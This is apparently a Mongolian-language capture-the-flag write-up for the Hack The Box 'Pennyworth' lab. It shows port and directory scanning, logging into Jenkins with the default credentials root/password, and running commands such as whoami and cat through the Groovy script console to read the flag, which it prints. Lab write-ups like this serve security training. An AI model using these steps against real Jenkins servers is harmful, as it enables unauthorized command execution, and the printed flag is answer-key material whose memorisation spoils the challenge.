# Pennyworth - htb machine
----------------------------------
![Screenshot (27)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/d6697f4e-0184-4c71-a9f2-648060be8b93)
#### pennyworth
![Screenshot (28)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/2754e2b6-d8e5-42c0-84af-5ae7fb7ab3bf)

* ip address = 10.129.93.159


![Screenshot (29)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/76bc71f6-77cc-4951-8e06-725f5cec3842)

#### nmap tool ашиглан портуудыг харав 
* nmap -sC -sV 10.129.93.159
* ![Screenshot (26)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/75827b18-34cc-4d5b-81fe-349fed3abcad)
* 8080 дээр web server асаж байсан бөгөөд login user interface тэй байсан
  
  ![Screenshot (30)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/93ab1553-7230-447e-af71-4c34d89d7017)
##### gobuster dir  -u https://10.129.93.159:8080 -w /usr/share/wordlists/dirb/common.txt


![Screenshot (31)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4006e89d-fa72-4201-a961-ec0950a7770f)
#### whatweb командаар веб серверийн дэлгэрэнгүй мэдээллийг олж харсан *Jenkins session 
![Screenshot (32)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/1c25b470-f320-46c7-8635-a824fc628077)
#### Metasploit ашиглаад сэжиг бүхий  Jenkins-CI login Utility байв

___________________________________
![Screenshot (33)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/efddd5c2-8f76-4140-9b53-0299e177e7a6)

#### username: root
    password: password
гээд шалгатал admin эрхээр шууд оров
![Screenshot (34)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4a6e5730-afd3-4415-bb25-939f1e2d68d1)
#### administrator оор нэвтэрсэн тул dashboard гэх зэрэг бүхий бүх эрхийг өөрчилж болох учир Groovy Script гэсэн 'execute command 'бичиж болохоор байв

![Screenshot (36)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/12fc70f7-d85b-40b3-8eeb-c4d01eb4781c)

![Screenshot (39)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/b8246a8d-b098-4201-a3b0-c17aa5018ce7)
* println System.genenv("PATH")
* println "uname -a".execute().text
* ![Screenshot (40)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/e2617c57-b22b-448d-aac6-a4ba47f2b35d)
* уг командыг адилхан оруултал Result хэсэгдээр хэрэглэгчийн сервер GNU/linux -Ubuntu гэж зааж байв
* ![Screenshot (42)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/c98a4a7d-adc2-45bb-814b-215ea8a0f8a5)
* дараагаар uname ийн оронд "whoami" гэж үзтэл root гэдэг утгын буцаасан
* ![Screenshot (43)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/37f8fd65-8b31-4f10-8f90-65688f6a206e)
ls list хийхэд bin boot dev etc lib32
![Screenshot (45)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/4f29c200-57fb-4386-b4cc-23d6827e593b)


![Screenshot (45)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/161a1ce6-c905-42b3-9199-1349e2970a3d)
#####pritln "ls root".execute().text
result flag.txt
snap гэдэг үр дүнг өгч байв


![Screenshot (46)](https://github.com/T6X3G/F.NS357_Machine-s/assets/110654108/bd255386-d901-4c02-a031-9c9dd9a3e202)
эцэст нь "cat root/flag.txt" болгон өөрчилхөд 9cdfb39c7876e703e308864c917a15 flag өгөв

















  


